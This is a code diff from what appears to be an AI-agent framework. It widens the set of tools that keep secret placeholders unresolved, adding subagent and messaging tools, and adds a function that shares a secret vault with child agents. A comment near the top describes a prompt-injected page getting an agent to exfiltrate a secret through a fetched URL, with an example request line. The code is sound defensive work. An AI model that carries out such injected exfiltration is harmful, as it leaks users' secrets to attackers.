@@ -104,9 +104,18 @@ export function unmaskSecrets(session, value) {
 // business in a fetched URL or a search query, and swapping it in there would
 // let a prompt-injected page exfiltrate it (fetch https://site/?k=«secret:ID»)
 // from a host the user already approved, with no further prompt.
-const NO_UNMASK_TOOLS = new Set(['fetch_url', 'web_search', 'browser']);
+// Tools that hand text to another model (subagents, teammates, the advisor)
+// keep placeholders too; the child shares the vault, so its own tool calls
+// still receive the real value.
+const NO_UNMASK_TOOLS = new Set(['fetch_url', 'web_search', 'browser', 'task', 'send_message', 'team_send_message', 'team_create', 'workflow', 'advisor', 'run_specialist_review']);
 
-/** unmaskSecrets() for one tool call; network-read tools keep the placeholders. */
+/** Lets a subagent resolve the parent's placeholders without seeing the values. */
+export function shareSecretVault(parent, child) {
+  if (!parent || !child) return;
+  Object.defineProperty(child, 'secretVault', { value: vaultOf(parent), writable: true, configurable: true, enumerable: false });
+}
+
+/** unmaskSecrets() for one tool call; network-read and agent-message tools keep the placeholders. */
 export function unmaskSecretsForTool(session, toolName, value) {
   return NO_UNMASK_TOOLS.has(String(toolName || '')) ? value : unmaskSecrets(session, value);
 }
